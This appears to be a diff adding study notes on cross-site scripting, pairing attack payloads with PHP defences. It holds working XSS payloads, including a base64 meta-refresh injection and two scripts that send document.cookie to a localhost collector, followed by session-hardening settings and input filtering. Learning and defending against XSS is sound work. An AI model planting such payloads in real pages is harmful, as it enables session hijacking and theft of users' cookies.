@@ -1,0 +1,44 @@
+/**** XSS *****/
+
+// alert
+<script>alert("test")</script>
+
+//alert
+<META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+
+
+
+//rouba cookie
+<SCRIPT type="text/javascript">
+window.location="http://localhost/xss/index.php?cookie=" +escape(document.cookie);
+</SCRIPT>
+
+
+<script>
+document: image = new Image(); 
+image.src="http://localhost/xss/index.php?cookie="+document.cookie;
+</script>
+
+
+
+
+//**  defense  ***/
+
+// **PREVENTING SESSION HIJACKING**
+// Prevents javascript XSS attacks aimed to steal the session ID
+ini_set('session.cookie_httponly', 1);
+
+// **PREVENTING SESSION FIXATION**
+// Session ID cannot be passed through URLs
+ini_set('session.use_only_cookies', 1);
+
+// Uses a secure connection (HTTPS) if possible
+ini_set('session.cookie_secure', 1);
+
+
+addslashes($cookie)
+filter_input(INPUT_GET, 'search', FILTER_SANITIZE_SPECIAL_CHARS);
+
+
+
